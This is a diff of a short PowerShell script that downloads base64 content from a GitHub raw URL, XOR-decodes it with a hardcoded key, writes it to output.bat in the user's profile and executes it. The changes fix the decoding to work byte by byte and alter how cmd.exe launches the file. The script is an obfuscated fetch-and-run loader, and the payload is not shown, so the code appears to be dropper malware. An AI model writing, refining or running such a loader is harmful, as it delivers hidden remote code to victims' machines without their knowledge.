@@ -2,15 +2,16 @@ $u='https://raw.githubusercontent.com/Jakeryan500/a/refs/heads/main/skibidi'
 $k='moon'
 $p="$env:USERPROFILE\output.bat"
 
-$d = (iwr $u -UseBasicParsing).Content.Trim()
-$b = [Convert]::FromBase64String($d)
+$d=(iwr $u -UseBasicParsing).Content.Trim()
+$b=[Convert]::FromBase64String($d)
+$kb=[Text.Encoding]::UTF8.GetBytes($k)
 
-$o = -join([char[]]($b | % {$i=0} {
-    $_ -bxor [byte][char]$k[$i++ % $k.Length]
-}))
+$out=New-Object byte[] $b.Length
+for($i=0;$i -lt $b.Length;$i++){
+    $out[$i]=$b[$i] -bxor $kb[$i % $kb.Length]
+}
+
+[IO.File]::WriteAllBytes($p,$out)
 
 
-$o | Out-File $p
-
-    cmd /c $p
-
+Start-Process cmd.exe -ArgumentList '/c $p' -UseNewEnvironment -Wait
